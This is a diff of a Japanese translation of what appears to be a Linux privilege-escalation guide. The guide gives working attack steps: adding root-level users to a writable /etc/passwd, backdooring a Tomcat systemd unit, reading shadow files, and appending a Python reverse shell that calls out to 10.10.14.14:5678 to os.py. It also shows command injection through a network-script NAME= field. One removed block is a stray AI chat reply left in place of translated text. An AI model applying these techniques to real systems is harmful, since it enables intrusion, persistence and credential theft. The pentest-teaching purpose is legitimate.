+ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザが新しいシェルを実行したときに**実行されるスクリプト**です。したがって、**それらのいずれかに書き込みまたは変更できる場合、権限を昇格できます**。
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-不審なプロファイルスクリプトが見つかった場合は、**機密情報** が含まれていないか確認してください。
+もし不審なプロファイルスクリプトが見つかったら、**機密情報**がないか確認してください。
 
 ### Passwd/Shadow ファイル
 
-OSによっては `/etc/passwd` と `/etc/shadow` が別名だったりバックアップが存在することがあります。そのため、**それらをすべて見つける** と **読み取れるか確認する**（ファイル内に **ハッシュがあるかどうか** を確認するため）ことを推奨します：
+OSによっては`/etc/passwd`や`/etc/shadow`のファイル名が異なる、またはバックアップが存在する場合があります。したがって、**すべてを見つけ出し**、それらを**読み取れるか確認し**、ファイル内に**ハッシュが含まれているか**を調べることを推奨します:
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-場合によっては、**password hashes** が `/etc/passwd`（または同等のファイル）に含まれていることがあります。
+場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
-### 書き込み可能な /etc/passwd
+### Writable /etc/passwd
 
-まず、次のいずれかのコマンドでパスワードを生成します。
+まず、次のコマンドのいずれかでパスワードを生成します。
 ```
 openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-翻訳する対象の README.md の内容をこちらに貼ってください。ファイル本文を受け取ってから、指定どおりマークダウン構文を維持して日本語へ翻訳します。
-
-また、「ユーザー `hacker` を追加して生成したパスワードを追加する」という件について確認させてください：
-- README に「`hacker` と生成パスワードを追記」してよいですか（ファイル内容に書き加えますか）？
-- 生成するパスワードはどの方法で作りますか（例: openssl rand -base64 12、pwgen、/dev/urandom など）？
-- 生成したパスワードをプレーンテキストで表示しますか、それともハッシュ（shadow 用の暗号化）を記載しますか？
-
-指示を確認いただければ、翻訳と同時に README への追記（`hacker` とそのパスワード）を行います。
+次に、ユーザー `hacker` を追加し、生成されたパスワードを設定してください。
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
 例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-これで `su` コマンドを使って `hacker:hacker` を使用できます
+これで`su`コマンドを`hacker:hacker`で使用できます。
 
-または、以下の行を使用してパスワードなしのダミーユーザーを追加できます。\
+あるいは、以下の行を使ってパスワードなしのダミーのユーザーを追加できます。\
 警告: マシンの現在のセキュリティが低下する可能性があります。
 ```
 echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
 su - dummy
 ```
-注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` にリネームされています。
+注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` にリネームされています。
 
-機密性の高いファイルに**書き込みができるか**を確認してください。例えば、いくつかの**サービスの設定ファイル**に書き込めますか？
+いくつかの**機密ファイルに書き込み可能か**確認する必要があります。例えば、いくつかの**サービス構成ファイル**に書き込めますか？
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-例えば、マシンが **tomcat** server を実行していて、かつ **modify the Tomcat service configuration file inside /etc/systemd/,** が可能であれば、次の行を変更できます：
+例えば、マシンが **tomcat** サーバを実行していて、かつ **/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる,** なら、次の行を変更できます:
 ```
 ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-tomcatが次に起動されると、あなたの backdoor は実行されます。
+あなたの backdoor は次回 tomcat が起動したときに実行されます。
 
 ### フォルダを確認
 
-以下のフォルダにはバックアップや有用な情報が含まれている可能性があります： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （最後のものはおそらく読めないでしょうが、試してみてください）
+以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （最後のものはおそらく読み取れないでしょうが、試してみてください）
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
@@ -1440,7 +1445,7 @@ find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -pat
 done
 done
 ```
-### 直近数分に変更されたファイル
+### 直近数分で変更されたファイル
 ```bash
 find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
 ```
@@ -1456,12 +1461,12 @@ find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -nam
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **PATH内のScript/Binaries**
+### **PATH内の Script/Binaries**
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
-### **Webファイル**
+### **Web ファイル**
 ```bash
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
@@ -1474,20 +1479,20 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 ```
 ### パスワードを含む既知のファイル
 
-[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを確認してください。これはパスワードを含んでいる可能性のある**複数のファイルを検索**します。\
-**もう一つの興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは Windows、Linux & Mac のローカルコンピュータに保存された大量のパスワードを取得するためのオープンソースアプリケーションです。
+[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含んでいる可能性のある複数のファイル** を検索します。\
+**もう一つの興味深いツール** として利用できるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、ローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースのアプリケーションです (Windows, Linux & Mac)。
 
 ### ログ
 
-ログを読むことができれば、**興味深い／機密情報が含まれている可能性があります**。ログが奇妙であるほど、より興味深い内容が見つかる可能性が高いです（おそらく）。\
-また、**不正に**設定された（バックドア入り？）**監査ログ**では、この投稿で説明されているように、監査ログ内に**パスワードを記録**できる場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/].
+ログを読めるなら、**その中から興味深い／機密情報を見つけられる**かもしれません。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
+また、一部の "**不適切**" に設定された（backdoored？）**audit logs** は、投稿で説明されているように audit logs 内にパスワードを **記録する** ことを可能にする場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
-ログを読むためには、グループ [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。
+ログを読むためには、**ログを読むグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。
 
-### Shell files
+### シェルファイル
 ```bash
 ~/.bash_profile # if it exists, read it once when you log in to the shell
 ~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
@@ -1500,41 +1505,41 @@ grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
 ### Generic Creds Search/Regex
 
-ファイル名や内容に "**password**" という単語が含まれているファイルを確認し、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックするべきです。\
-ここでこれらをすべて行う方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最終チェックを確認してください。
+ファイル名（**名前**）や**内容**の中に「**password**」という単語が含まれているファイルを確認してください。また、ログ内のIPやメール、ハッシュのregexpもチェックしてください。\
+ここではこれらすべてのやり方を列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。
 
 ## 書き込み可能なファイル
 
 ### Python library hijacking
 
-もし **どこから** python スクリプトが実行されるかが分かっていて、そのフォルダに **書き込みできる** か、あるいは **python libraries を変更できる** なら、OS ライブラリを改変して backdoor を仕込むことができます（python スクリプトが実行される場所に書き込み可能なら、os.py ライブラリをコピーして貼り付けてください）。
+もし python スクリプトが**どこから**実行されるかが分かっていて、そのフォルダに**書き込みできる**、または**python ライブラリを変更できる**場合、OS ライブラリを修正して backdoor できます（python スクリプトが実行される場所に書き込み可能なら、os.py ライブラリをコピーして貼り付けてください）。
 
-To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
+**backdoor the library**するには、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更してください）：
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Logrotate exploitation
+### Logrotate の悪用
 
-`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **write permissions** を持つユーザーが権限昇格する可能性があります。これは `logrotate` が多くの場合 **root** として動作し、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。権限の確認は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで行うことが重要です。
+`logrotate` に存在する脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を引き起こす可能性があります。これは `logrotate` が多くの場合 **root** として実行され、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するよう操作できるためです。権限は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで確認することが重要です。
 
 > [!TIP]
-> この脆弱性は `logrotate` の `3.18.0` 以前のバージョンに影響します
+> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します
 
-脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
+脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。
 
 この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。
 
-この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に類似しているため、ログを変更できることが分かった場合は、それらのログを誰が管理しているかを確認し、ログを symlinks に置き換えて権限昇格できないか確認してください。
+この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** に非常によく似ています。ログを変更できることが分かった場合は、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに差し替えて特権昇格が可能かどうかを確認してください。
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+**脆弱性リファレンス:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **write** できる、または既存のものを **adjust** できる場合、**system is pwned** です。
+何らかの理由で、ユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込み** できる、または既存のものを **修正** できる場合、あなたの **system is pwned** です。
 
-Network scripts（例: _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルと同じです。しかし、Linux 上では Network Manager (dispatcher.d) によって \~sourced\~ されます。
+Network scripts（例えば _ifcg-eth0_）はネットワーク接続に使用され、見た目は .INI ファイルそのものです。しかし、それらは Linux 上で Network Manager (dispatcher.d) によって \~sourced\~ されます。
 
-私のケースでは、これらの network scripts 内の `NAME=` 属性が正しく処理されていません。**名前に white/blank space が含まれていると、システムはその空白の後の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。
+私の場合、これらのネットワークスクリプト内の `NAME=` の値が正しく処理されていません。名前に **空白/ブランクスペース** があると、システムは空白以降の部分を実行しようとします。つまり、**最初の空白以降のすべてが root として実行される**、ということです。
 
 例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
@@ -1542,15 +1547,15 @@ NAME=Network /bin/id
 ONBOOT=yes
 DEVICE=eth0
 ```
-（_Network と /bin/id_ の間の空白に注意_）
+(_Network と /bin/id の間の空白に注意_)
 
 ### **init, init.d, systemd, and rc.d**
 
-ディレクトリ `/etc/init.d` は System V init (SysVinit) のための **スクリプト** が置かれる場所です。これは **古典的な Linux サービス管理システム** で、サービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトを含みます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。
+ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **scripts** の置き場です。`start`、`stop`、`restart`、場合によっては `reload` といったサービス操作用のスクリプトが含まれ、これらは直接実行するか `/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。
 
-一方で `/etc/init` は **Upstart** に関連付けられており、Ubuntu が導入した新しい **サービス管理** で、設定ファイルを使ってサービス管理を行います。Upstart への移行があっても、互換性レイヤにより SysVinit スクリプトは Upstart の設定と併用されます。
+一方で `/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **service management** で、サービス管理用の設定ファイルを使用します。Upstart への移行後も互換レイヤーにより SysVinit スクリプトが Upstart 設定と並行して利用されます。
 
-**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ向けに `/usr/lib/systemd/`、管理者による変更向けに `/etc/systemd/system/` に整理され、システム管理を効率化します。
+**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルはディストリビューションパッケージ向けに `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` に整理され、システム管理が効率化されます。
 
 ## Other Tricks
 
@@ -1577,7 +1582,7 @@ cisco-vmanage.md
 
 ## Android rooting frameworks: manager-channel abuse
 
-Android の rooting フレームワークは一般的に syscall をフックして特権のある kernel 機能を userspace の manager に公開します。マネージャの認証が弱い場合（例：FD-order に基づく署名チェックや脆弱なパスワード方式）には、ローカルアプリがマネージャになりすまして、既に root 化されたデバイス上で root にエスカレーションできる可能性があります。詳細とエクスプロイトは次を参照してください：
+Android の rooting frameworks は一般に syscall をフックして特権カーネル機能をユーザースペースの manager に公開します。弱い manager 認証（例：FD-order に基づく署名チェックや脆弱なパスワード方式）があると、ローカルアプリが manager を偽装して既に root 化されたデバイスで root に昇格することが可能になります。詳細とエクスプロイトの情報は以下を参照してください：
 
 
 {{#ref}}
@@ -1586,9 +1591,9 @@ android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 
 ## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)
 
-VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v オプション付きで実行する可能性があります。許容度の高いパターン（例：\S の使用）は、書き込み可能な場所（例：/tmp/httpd）に配置した攻撃者制御のリスナーにマッチし、root として実行される（CWE-426 Untrusted Search Path）恐れがあります。
+VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v を付けて実行することがあります。許容度の高いパターン（例：\S の使用）は、書き込み可能な場所（例：/tmp/httpd）に配置した攻撃者のリスナーとマッチし、root として実行される可能性があり（CWE-426 Untrusted Search Path）、脆弱性につながります。
 
-詳細および他の discovery/monitoring スタックにも適用できる一般化パターンは次を参照してください：
+詳しくは、他の discovery/monitoring スタックにも適用可能な一般化パターンを以下で確認してください：
 
 {{#ref}}
 vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
@@ -1605,17 +1610,17 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 
 ## Linux/Unix Privesc Tools
 
-### **Linux のローカル権限昇格ベクターを探すための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** カーネルの脆弱性を Linux と MAC で列挙する [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
-**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
+**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
 **Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## References
